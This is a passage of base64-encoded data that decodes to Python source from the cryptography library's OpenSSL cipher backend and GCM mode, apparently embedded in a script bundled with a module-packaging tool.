lbiA4IGFuZCAxMjggYnl0ZXMgKDY0ICJcclxuICAgICAgICAgICAgICAgICJhbmQgMTAyNCBiaXRzKS4iXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBzZWxmLl9pbml0aWFsaXphdGlvbl92ZWN0b3IgPSBpbml0aWFsaXphdGlvbl92ZWN0b3JcclxuICAgICAgICBpZiB0YWcgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHV0aWxzLl9jaGVja19ieXRlcygidGFnIiwgdGFnKVxyXG4gICAgICAgICAgICBpZiBtaW5fdGFnX2xlbmd0aCA8IDQ6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJtaW5fdGFnX2xlbmd0aCBtdXN0IGJlID49IDQiKVxyXG4gICAgICAgICAgICBpZiBsZW4odGFnKSA8IG1pbl90YWdfbGVuZ3RoOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAiQXV0aGVudGljYXRpb24gdGFnIG11c3QgYmUge30gYnl0ZXMgb3IgbG9uZ2VyLiIuZm9ybWF0KFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBtaW5fdGFnX2xlbmd0aFxyXG4gICAgICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICBzZWxmLl90YWcgPSB0YWdcclxuICAgICAgICBzZWxmLl9taW5fdGFnX2xlbmd0aCA9IG1pbl90YWdfbGVuZ3RoXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgdGFnKHNlbGYpIC0+IHR5cGluZy5PcHRpb25hbFtieXRlc106XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3RhZ1xyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGluaXRpYWxpemF0aW9uX3ZlY3RvcihzZWxmKSAtPiBieXRlczpcclxuICAgICAgICByZXR1cm4gc2VsZi5faW5pdGlhbGl6YXRpb25fdmVjdG9yXHJcblxyXG4gICAgZGVmIHZhbGlkYXRlX2Zvcl9hbGdvcml0aG0oc2VsZiwgYWxnb3JpdGhtOiBDaXBoZXJBbGdvcml0aG0pIC0+IE5vbmU6XHJcbiAgICAgICAgX2NoZWNrX2Flc19rZXlfbGVuZ3RoKHNlbGYsIGFsZ29yaXRobSlcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShhbGdvcml0aG0sIEJsb2NrQ2lwaGVyQWxnb3JpdGhtKTpcclxuICAgICAgICAgICAgcmFpc2UgVW5zdXBwb3J0ZWRBbGdvcml0aG0oXHJcbiAgICAgICAgICAgICAgICAiR0NNIHJlcXVpcmVzIGEgYmxvY2sgY2lwaGVyIGFsZ29yaXRobSIsXHJcbiAgICAgICAgICAgICAgICBfUmVhc29ucy5VTlNVUFBPUlRFRF9DSVBIRVIsXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBibG9ja19zaXplX2J5dGVzID0gYWxnb3JpdGhtLmJsb2NrX3NpemUgLy8gOFxyXG4gICAgICAgIGlmIHNlbGYuX3RhZyBpcyBub3QgTm9uZSBhbmQgbGVuKHNlbGYuX3RhZykgPiBibG9ja19zaXplX2J5dGVzOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIkF1dGhlbnRpY2F0aW9uIHRhZyBjYW5ub3QgYmUgbW9yZSB0aGFuIHt9IGJ5dGVzLiIuZm9ybWF0KFxyXG4gICAgICAgICAgICAgICAgICAgIGJsb2NrX3NpemVfYnl0ZXNcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgKVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9iYWNrZW5kcy9vcGVuc3NsL2NpcGhlcnMucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5pbXBvcnQgdHlwaW5nXHJcblxyXG5mcm9tIGNyeXB0b2dyYXBoeS5leGNlcHRpb25zIGltcG9ydCBJbnZhbGlkVGFnLCBVbnN1cHBvcnRlZEFsZ29yaXRobSwgX1JlYXNvbnNcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMgaW1wb3J0IGNpcGhlcnNcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuY2lwaGVycyBpbXBvcnQgYWxnb3JpdGhtcywgbW9kZXNcclxuXHJcblxyXG5pZiB0eXBpbmcuVFlQRV9DSEVDS0lORzpcclxuICAgIGZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcy5vcGVuc3NsLmJhY2tlbmQgaW1wb3J0IEJhY2tlbmRcclxuXHJcblxyXG5jbGFzcyBfQ2lwaGVyQ29udGV4dDpcclxuICAgIF9FTkNSWVBUID0gMVxyXG4gICAgX0RFQ1JZUFQgPSAwXHJcbiAgICBfTUFYX0NIVU5LX1NJWkUgPSAyKiozMCAtIDFcclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZiwgYmFja2VuZDogIkJhY2tlbmQiLCBjaXBoZXIsIG1vZGUsIG9wZXJhdGlvbjogaW50XHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fYmFja2VuZCA9IGJhY2tlbmRcclxuICAgICAgICBzZWxmLl9jaXBoZXIgPSBjaXBoZXJcclxuICAgICAgICBzZWxmLl9tb2RlID0gbW9kZVxyXG4gICAgICAgIHNlbGYuX29wZXJhdGlvbiA9IG9wZXJhdGlvblxyXG4gICAgICAgIHNlbGYuX3RhZzogdHlwaW5nLk9wdGlvbmFsW2J5dGVzXSA9IE5vbmVcclxuXHJcbiAgICAgICAgaWYgaXNpbnN0YW5jZShzZWxmLl9jaXBoZXIsIGNpcGhlcnMuQmxvY2tDaXBoZXJBbGdvcml0aG0pOlxyXG4gICAgICAgICAgICBzZWxmLl9ibG9ja19zaXplX2J5dGVzID0gc2VsZi5fY2lwaGVyLmJsb2NrX3NpemUgLy8gOFxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHNlbGYuX2Jsb2NrX3NpemVfYnl0ZXMgPSAxXHJcblxyXG4gICAgICAgIGN0eCA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfQ0lQSEVSX0NUWF9uZXcoKVxyXG4gICAgICAgIGN0eCA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5nYyhcclxuICAgICAgICAgICAgY3R4LCBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX0NJUEhFUl9DVFhfZnJlZVxyXG4gICAgICAgIClcclxuXHJcbiAgICAgICAgcmVnaXN0cnkgPSBzZWxmLl9iYWNrZW5kLl9jaXBoZXJfcmVnaXN0cnlcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIGFkYXB0ZXIgPSByZWdpc3RyeVt0eXBlKGNpcGhlciksIHR5cGUobW9kZSldXHJcbiAgICAgICAgZXhjZXB0IEtleUVycm9yOlxyXG4gICAgICAgICAgICByYWlzZSBVbnN1cHBvcnRlZEFsZ29yaXRobShcclxuICAgICAgICAgICAgICAgICJjaXBoZXIge30gaW4ge30gbW9kZSBpcyBub3Qgc3VwcG9ydGVkICJcclxuICAgICAgICAgICAgICAgICJieSB0aGlzIGJhY2tlbmQuIi5mb3JtYXQoXHJcbiAgICAgICAgICAgICAgICAgICAgY2lwaGVyLm5hbWUsIG1vZGUubmFtZSBpZiBtb2RlIGVsc2UgbW9kZVxyXG4gICAgICAgICAgICAgICAgKSxcclxuICAgICAgICAgICAgICAgIF9SZWFzb25zLlVOU1VQUE9SVEVEX0NJUEhFUixcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBldnBfY2lwaGVyID0gYWRhcHRlcihzZWxmLl9iYWNrZW5kLCBjaXBoZXIsIG1vZGUpXHJcbiAgICAgICAgaWYgZXZwX2NpcGhlciA9PSBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTDpcclxuICAgICAgICAgICAgbXNnID0gImNpcGhlciB7MC5uYW1lfSAiLmZvcm1hdChjaXBoZXIpXHJcbiAgICAgICAgICAgIGlmIG1vZGUgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgICAgICBtc2cgKz0gImluIHswLm5hbWV9IG1vZGUgIi5mb3JtYXQobW9kZSlcclxuICAgICAgICAgICAgbXNnICs9IChcclxuICAgICAgICAgICAgICAgICJpcyBub3Qgc3VwcG9ydGVkIGJ5IHRoaXMgYmFja2VuZCAoWW91ciB2ZXJzaW9uIG9mIE9wZW5TU0wgIlxyXG4gICAgICAgICAgICAgICAgIm1heSBiZSB0b28gb2xkLiBDdXJyZW50IHZlcnNpb246IHt9LikiXHJcbiAgICAgICAgICAgICkuZm9ybWF0KHNlbGYuX2JhY2tlbmQub3BlbnNzbF92ZXJzaW9uX3RleHQoKSlcclxuICAgICAgICAgICAgcmFpc2UgVW5zdXBwb3J0ZWRBbGdvcml0aG0obXNnLCBfUmVhc29ucy5VTlNVUFBPUlRFRF9DSVBIRVIpXHJcblxyXG4gICAgICAgIGlmIGlzaW5zdGFuY2UobW9kZSwgbW9kZXMuTW9kZVdpdGhJbml0aWFsaXphdGlvblZlY3Rvcik6XHJcbiAgICAgICAgICAgIGl2X25vbmNlID0gc2VsZi5fYmFja2VuZC5fZmZpLmZyb21fYnVmZmVyKFxyXG4gICAgICAgICAgICAgICAgbW9kZS5pbml0aWFsaXphdGlvbl92ZWN0b3JcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIGVsaWYgaXNpbnN0YW5jZShtb2RlLCBtb2Rlcy5Nb2RlV2l0aFR3ZWFrKTpcclxuICAgICAgICAgICAgaXZfbm9uY2UgPSBzZWxmLl9iYWNrZW5kLl9mZmkuZnJvbV9idWZmZXIobW9kZS50d2VhaylcclxuICAgICAgICBlbGlmIGlzaW5zdGFuY2UobW9kZSwgbW9kZXMuTW9kZVdpdGhOb25jZSk6XHJcbiAgICAgICAgICAgIGl2X25vbmNlID0gc2VsZi5fYmFja2VuZC5fZmZpLmZyb21fYnVmZmVyKG1vZGUubm9uY2UpXHJcbiAgICAgICAgZWxpZiBpc2luc3RhbmNlKGNpcGhlciwgYWxnb3JpdGhtcy5DaGFDaGEyMCk6XHJcbiAgICAgICAgICAgIGl2X25vbmNlID0gc2VsZi5fYmFja2VuZC5fZmZpLmZyb21fYnVmZmVyKGNpcGhlci5ub25jZSlcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBpdl9ub25jZSA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMXHJcbiAgICAgICAgIyBiZWdpbiBpbml0IHdpdGggY2lwaGVyIGFuZCBvcGVyYXRpb24gdHlwZVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfQ2lwaGVySW5pdF9leChcclxuICAgICAgICAgICAgY3R4LFxyXG4gICAgICAgICAgICBldnBfY2lwaGVyLFxyXG4gICAgICAgICAgICBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTCxcclxuICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwsXHJcbiAgICAgICAgICAgIHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMLFxyXG4gICAgICAgICAgICBvcGVyYXRpb24sXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzICE9IDApXHJcbiAgICAgICAgIyBzZXQgdGhlIGtleSBsZW5ndGggdG8gaGFuZGxlIHZhcmlhYmxlIGtleSBjaXBoZXJzXHJcbiAgICAgICAgcmVzID0gc2VsZi5fYmFja2VuZC5fbGliLkVWUF9DSVBIRVJfQ1RYX3NldF9rZXlfbGVuZ3RoKFxyXG4gICAgICAgICAgICBjdHgsIGxlbihjaXBoZXIua2V5KVxyXG4gICAgICAgIClcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHJlcyAhPSAwKVxyXG4gICAgICAgIGlmIGlzaW5zdGFuY2UobW9kZSwgbW9kZXMuR0NNKTpcclxuICAgICAgICAgICAgcmVzID0gc2VsZi5fYmFja2VuZC5fbGliLkVWUF9DSVBIRVJfQ1RYX2N0cmwoXHJcbiAgICAgICAgICAgICAgICBjdHgsXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX0NUUkxfQUVBRF9TRVRfSVZMRU4sXHJcbiAgICAgICAgICAgICAgICBsZW4oaXZfbm9uY2UpLFxyXG4gICAgICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwsXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgIT0gMClcclxuICAgICAgICAgICAgaWYgbW9kZS50YWcgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgICAgICByZXMgPSBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX0NJUEhFUl9DVFhfY3RybChcclxuICAgICAgICAgICAgICAgICAgICBjdHgsXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5fbGliLkVWUF9DVFJMX0FFQURfU0VUX1RBRyxcclxuICAgICAgICAgICAgICAgICAgICBsZW4obW9kZS50YWcpLFxyXG4gICAgICAgICAgICAgICAgICAgIG1vZGUudGFnLFxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgIT0gMClcclxuICAgICAgICAgICAgICAgIHNlbGYuX3RhZyA9IG1vZGUudGFnXHJcblxyXG4gICAgICAgICMgcGFzcyBrZXkvaXZcclxuICAgICAgICByZXMgPSBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX0NpcGhlckluaXRfZXgoXHJcbiAgICAgICAgICAgIGN0eCxcclxuICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwsXHJcbiAgICAgICAgICAgIHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMLFxyXG4gICAgICAgICAgICBzZWxmLl9iYWNrZW5kLl9mZmkuZnJvbV9idWZmZXIoY2lwaGVyLmtleSksXHJcbiAgICAgICAgICAgIGl2X25vbmNlLFxyXG4gICAgICAgICAgICBvcGVyYXRpb24sXHJcbiAgICAgICAgKVxyXG5cclxuICAgICAgICAjIENoZWNrIGZvciBYVFMgbW9kZSBkdXBsaWNhdGUga2V5cyBlcnJvclxyXG4gICAgICAgIGVycm9ycyA9IHNlbGYuX2JhY2tlbmQuX2NvbnN1bWVfZXJyb3JzKClcclxuICAgICAgICBsaWIgPSBzZWxmLl9iYWNrZW5kLl9saWJcclxuICAgICAgICBpZiByZXMgPT0gMCBhbmQgKFxyXG4gICAgICAgICAgICAoXHJcbiAgICAgICAgICAgICAgICBsaWIuQ1JZUFRPR1JBUEhZX09QRU5TU0xfMTExRF9PUl9HUkVBVEVSXHJcbiAgICAgICAgICAgICAgICBhbmQgZXJyb3JzWzBdLl9saWJfcmVhc29uX21hdGNoKFxyXG4gICAgICAgICAgICAgICAgICAgIGxpYi5FUlJfTElCX0VWUCwgbGliLkVWUF9SX1hUU19EVVBMSUNBVEVEX0tFWVNcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICBvciAoXHJcbiAgICAgICAgICAgICAgICBsaWIuQ3J5cHRvZ3JhcGh5X0hBU19QUk9WSURFUlNcclxuICAgICAgICAgICAgICAgIGFuZCBlcnJvcnNbMF0uX2xpYl9yZWFzb25fbWF0Y2goXHJcbiAgICAgICAgICAgICAgICAgICAgbGliLkVSUl9MSUJfUFJPViwgbGliLlBST1ZfUl9YVFNfRFVQTElDQVRFRF9LRVlTXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJJbiBYVFMgbW9kZSBkdXBsaWNhdGVkIGtleXMgYXJlIG5vdCBhbGxvd2VkIilcclxuXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgIT0gMCwgZXJyb3JzPWVycm9ycylcclxuXHJcbiAgICAgICAgIyBXZSBwdXJwb3NlbHkgZGlzYWJsZSBwYWRkaW5nIGhlcmUgYXMgaXRcJ3MgaGFuZGxlZCBoaWdoZXIgdXAgaW4gdGhlXHJcbiAgICAgICAgIyBBUEkuXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5fbGliLkVWUF9DSVBIRVJfQ1RYX3NldF9wYWRkaW5nKGN0eCwgMClcclxuICAgICAgICBzZWxmLl9jdHggPSBjdHhcclxuXHJcbiAgICBkZWYgdXBkYXRlKHNlbGYsIGRhdGE6IGJ5dGVzKSAtPiBieXRlczpcclxuICAgICAgICBidWYgPSBieXRlYXJyYXkobGVuKGRhdGEpICsgc2VsZi5fYmxvY2tfc2l6ZV9ieXRlcyAtIDEpXHJcbiAgICAgICAgbiA9IHNlbGYudXBkYXRlX2ludG8oZGF0YSwgYnVmKVxyXG4gICAgICAgIHJldHVybiBieXRlcyhidWZbOm5dKVxyXG5cclxuICAgIGRlZiB1cGRhdGVfaW50byhzZWxmLCBkYXRhOiBieXRlcywgYnVmOiBieXRlcykgLT4gaW50OlxyXG4gICAgICAgIHRvdGFsX2RhdGFfbGVuID0gbGVuKGRhdGEpXHJcbiAgICAgICAgaWYgbGVuKGJ1ZikgPCAodG90YWxfZGF0YV9sZW4gKyBzZWxmLl9ibG9ja19zaXplX2J5dGVzIC0gMSk6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiYnVmZmVyIG11c3QgYmUgYXQgbGVhc3Qge30gYnl0ZXMgZm9yIHRoaXMgIlxyXG4gICAgICAgICAgICAgICAgInBheWxvYWQiLmZvcm1hdChsZW4oZGF0YSkgKyBzZWxmLl9ibG9ja19zaXplX2J5dGVzIC0gMSlcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBkYXRhX3Byb2Nlc3NlZCA9IDBcclxuICAgICAgICB0b3RhbF9vdXQgPSAwXHJcbiAgICAgICAgb3V0bGVuID0gc2VsZi5fYmFja2VuZC5fZmZpLm5ldygiaW50ICoiKVxyXG4gICAgICAgIGJhc2VvdXRidWYgPSBzZWxmLl9iYWNrZW5kLl9mZmkuZnJvbV9idWZmZXIoYnVmKVxyXG4gICAgICAgIGJhc2VpbmJ1ZiA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5mcm9tX2J1ZmZlcihkYXRhKVxyXG5cclxuICAgICAgICB3aGlsZSBkYXRhX3Byb2Nlc3NlZCAhPSB0b3RhbF9kYXRhX2xlbjpcclxuICAgICAgICAgICAgb3V0YnVmID0gYmFzZW91dGJ1ZiArIHRvdGFsX291dFxyXG4gICAgICAgICAgICBpbmJ1ZiA9IGJhc2VpbmJ1ZiArIGRhdGFfcHJvY2Vzc2VkXHJcbiAgICAgICAgICAgIGlubGVuID0gbWluKHNlbGYuX01BWF9DSFVOS19TSVpFLCB0b3RhbF9kYXRhX2xlbiAtIGRhdGFfcHJvY2Vzc2VkKVxyXG5cclxuICAgICAgICAgICAgcmVzID0gc2VsZi5fYmFja2VuZC5fbGliLkVWUF9DaXBoZXJVcGRhdGUoXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9jdHgsIG91dGJ1Ziwgb3V0bGVuLCBpbmJ1ZiwgaW5sZW5cclxuICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICBpZiByZXMgPT0gMCBhbmQgaXNpbnN0YW5jZShzZWxmLl9tb2RlLCBtb2Rlcy5YVFMpOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5fY29uc3VtZV9lcnJvcnMoKVxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAiSW4gWFRTIG1vZGUgeW91IG11c3Qgc3VwcGx5IGF0IGxlYXN0IGEgZnVsbCBibG9jayBpbiB0aGUgIlxyXG4gICAgICAgICAgICAgICAgICAgICJmaXJzdCB1cGRhdGUgY2FsbC4gRm9yIEFFUyB0aGlzIGlzIDE2IGJ5dGVzLiJcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzICE9IDApXHJcbiAgICAgICAgICAgIGRhdGFfcHJvY2Vzc2VkICs9IGlubGVuXHJcbiAgICAgICAgICAgIHRvdGFsX291dCArPSBvdXRsZW5bMF1cclxuXHJcbiAgICAgICAgcmV0dXJuIHRvdGFsX291dFxyXG5cclxuICAgIGRlZiBmaW5hbGl6ZShzZWxmKSAtPiBieXRlczpcclxuICAgICAgICBpZiAoXHJcbiAgICAgICAgICAgIHNlbGYuX29wZXJhdGlvbiA9PSBzZWxmLl9ERUNSWVBUXHJcbiAgICAgICAgICAgIGFuZCBpc2luc3RhbmNlKHNlbGYuX21vZGUsIG1vZGVzLk1vZGVXaXRoQXV0aGVudGljYXRpb25UYWcpXHJcbiAgICAgICAgICAgIGFuZCBzZWxmLnRhZyBpcyBOb25lXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICJBdXRoZW50aWNhdGlvbiB0YWcgbXVzdCBiZSBwcm92aWRlZCB3aGVuIGRlY3J5cHRpbmcuIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIGJ1ZiA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoInVuc2lnbmVkIGNoYXJbXSIsIHNlbGYuX2Jsb2NrX3NpemVfYnl0ZXMpXHJcbiAgICAgICAgb3V0bGVuID0gc2VsZi5fYmFja2VuZC5fZmZpLm5ldygiaW50ICoiKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfQ2lwaGVyRmluYWxfZXgoc2VsZi5fY3R4LCBidWYsIG91dGxlbilcclxuICAgICAgICBpZiByZXMgPT0gMDpcclxuICAgICAgICAgICAgZXJyb3JzID0gc2VsZi5fYmFja2VuZC5fY29uc3VtZV9lcnJvcnMoKVxyXG5cclxuICAgICAgICAgICAgaWYgbm90IGVycm9ycyBhbmQgaXNpbnN0YW5jZShzZWxmLl9tb2RlLCBtb2Rlcy5HQ00pOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgSW52YWxpZFRhZ1xyXG5cclxuICAgICAgICAgICAgbGliID0gc2VsZi5fYmFja2VuZC5fbGliXHJcbiAgICAgICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoXHJcbiAgICAgICAgICAgICAgICBlcnJvcnNbMF0uX2xpYl9yZWFzb25fbWF0Y2goXHJcbiAgICAgICAgICAgICAgICAgICAgbGliLkVSUl9MSUJfRVZQLFxyXG4gICAgICAgICAgICAgICAgICAgIGxpYi5FVlBfUl9EQVRBX05PVF9NVUxUSVBMRV9PRl9CTE9DS19MRU5HVEgsXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgICAgICBvciAoXHJcbiAgICAgICAgICAgICAgICAgICAgbGliLkNyeXB0b2dyYXBoeV9IQVNfUFJPVklERVJTXHJcbiAgICAgICAgICAgICAgICAgICAgYW5kIGVycm9yc1swXS5fbGliX3JlYXNvbl9tYXRjaChcclxuICAgICAgICAgICAgICAgICAgICAgICAgbGliLkVSUl9MSUJfUFJPVixcclxuICAgICAgICAgICAgICAgICAgICAgICAgbGliLlBST1ZfUl9XUk9OR19GSU5BTF9CTE9DS19MRU5HVEgsXHJcbiAgICAgICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgb3IgKFxyXG4gICAgICAgICAgICAgICAgICAgIGxpYi5DUllQVE9HUkFQSFlfSVNfQk9SSU5HU1NMXHJcbiAgICAgICAgICAgICAgICAgICAgYW5kIGVycm9yc1swXS5yZWFzb25cclxuICAgICAgICAgICAgICAgICAgICA9PSBsaWIuQ0lQSEVSX1JfREFUQV9OT1RfTVVMVElQTEVfT0ZfQkxPQ0tfTEVOR1RIXHJcbiAgICAgICAgICAgICAgICApLFxyXG4gICAgICAgICAgICAgICAgZXJyb3JzPWVycm9ycyxcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIlRoZSBsZW5ndGggb2YgdGhlIHByb3ZpZGVkIGRhdGEgaXMgbm90IGEgbXVsdGlwbGUgb2YgIlxyXG4gICAgICAgICAgICAgICAgInRoZSBibG9jayBsZW5ndGguIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIGlmIChcclxuICAgICAgICAgICAgaXNpbnN0YW5jZShzZWxmLl9tb2RlLCBtb2Rlcy5HQ00pXHJcbiAgICAgICAgICAgIGFuZCBzZWxmLl9vcGVyYXRpb24gPT0gc2VsZi5fRU5DUllQVFxyXG4gICAgICAgICk6XHJcbiAgICAgICAgICAgIHRhZ19idWYgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KFxyXG4gICAgICAgICAgICAgICAgInVuc2lnbmVkIGNoYXJbXSIsIHNlbGYuX2Jsb2NrX3NpemVfYnl0ZXNcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICByZXMgPSBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX0NJUEhFUl9DVFhfY3RybChcclxuICAgICAgICAgICAgICAgIHNlbGYuX2N0eCxcclxuICAgICAgICAgICAgICAgIHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfQ1RSTF9BRUFEX0dFVF9UQUcsXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9ibG9ja19zaXplX2J5dGVzLFxyXG4gICAgICAgICAgICAgICAgdGFnX2J1ZixcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHJlcyAhPSAwKVxyXG4gICAgICAgICAgICBzZWxmLl90YWcgPSBzZWxmLl9iYWNrZW5kLl9mZmkuYnVmZmVyKHRhZ19idWYpWzpdXHJcblxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfQ0lQSEVSX0NUWF9yZXNldChzZWxmLl9jdHgpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuICAgICAgICByZXR1cm4gc2VsZi5fYmFja2VuZC5fZmZpLmJ1ZmZlcihidWYpWzogb3V0bGVuWzBdXVxyXG5cclxuICAgIGRlZiBmaW5hbGl6ZV93aXRoX3RhZyhzZWxmLCB0YWc6IGJ5dGVzKSAtPiBieXRlczpcclxuICAgICAgICB0YWdfbGVuID0gbGVuKHRhZylcclxuICAgICAgICBpZiB0YWdfbGVuIDwgc2VsZi5fbW9kZS5fbWluX3RhZ19sZW5ndGg6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiQXV0aGVudGljYXRpb24gdGFnIG11c3QgYmUge30gYnl0ZXMgb3IgbG9uZ2VyLiIuZm9ybWF0KFxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX21vZGUuX21pbl90YWdfbGVuZ3RoXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBlbGlmIHRhZ19sZW4gPiBzZWxmLl9ibG9ja19zaXplX2J5dGVzOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIkF1dGhlbnRpY2F0aW9uIHRhZyBjYW5ub3QgYmUgbW9yZSB0aGFuIHt9IGJ5dGVzLiIuZm9ybWF0KFxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX2Jsb2NrX3NpemVfYnl0ZXNcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfQ0lQSEVSX0NUWF9jdHJsKFxyXG4gICAgICAgICAgICBzZWxmLl9jdHgsIHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfQ1RSTF9BRUFEX1NFVF9UQUcsIGxlbih0YWcpLCB0YWdcclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgIT0gMClcclxuICAgICAgICBzZWxmLl90YWcgPSB0YWdcclxuICAgICAgICByZXR1cm4gc2VsZi5maW5hbGl6ZSgpXHJcblxyXG4gICAgZGVmIGF1dGhlbnRpY2F0ZV9hZGRpdGlvbmFsX2RhdGEoc2